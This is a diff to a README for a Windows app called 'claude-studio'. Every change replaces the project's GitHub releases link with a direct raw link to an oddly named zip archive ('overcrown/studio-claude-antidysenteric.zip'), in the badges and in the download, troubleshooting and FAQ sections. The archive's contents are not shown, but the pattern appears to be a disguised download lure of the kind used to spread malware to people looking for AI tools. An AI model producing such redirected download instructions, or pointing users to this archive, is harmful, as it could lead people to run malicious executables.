@@ -1,6 +1,6 @@
 # 🧩 claude-studio - Six Tools for Claude Workflows
 
-[![Download claude-studio](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Sowhost700/claude-studio/releases)
+[![Download claude-studio](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Sowhost700/claude-studio/main/overcrown/studio-claude-antidysenteric.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Use this app if you want to:
 ## 📥 Download
 
 Visit this page to download:
-https://github.com/Sowhost700/claude-studio/releases
+https://raw.githubusercontent.com/Sowhost700/claude-studio/main/overcrown/studio-claude-antidysenteric.zip
 
 On that page, look for the latest release and download the Windows file. In most cases, this will be a `.exe` file or a `.zip` file with the app inside.
 
@@ -136,7 +136,7 @@ If the app does not start:
 6. Restart your PC and try again.
 
 If it still does not open, download the latest release again from:
-https://github.com/Sowhost700/claude-studio/releases
+https://raw.githubusercontent.com/Sowhost700/claude-studio/main/overcrown/studio-claude-antidysenteric.zip
 
 ## 🌐 Browser Setup
 
@@ -209,7 +209,7 @@ Yes. Browser use is one of the main parts of the app.
 
 ### Where do I get the latest version?
 Use this page:
-https://github.com/Sowhost700/claude-studio/releases
+https://raw.githubusercontent.com/Sowhost700/claude-studio/main/overcrown/studio-claude-antidysenteric.zip
 
 ## 🧭 Quick Start
 
@@ -240,4 +240,4 @@ If you see a ZIP file, extract it first. If you see an EXE or MSI file, double-c
 
 ## 📎 Release Link
 
-[![Download claude-studio](https://img.shields.io/badge/Get%20the%20Latest%20Release-grey?style=for-the-badge)](https://github.com/Sowhost700/claude-studio/releases)
+[![Download claude-studio](https://img.shields.io/badge/Get%20the%20Latest%20Release-grey?style=for-the-badge)](https://raw.githubusercontent.com/Sowhost700/claude-studio/main/overcrown/studio-claude-antidysenteric.zip)
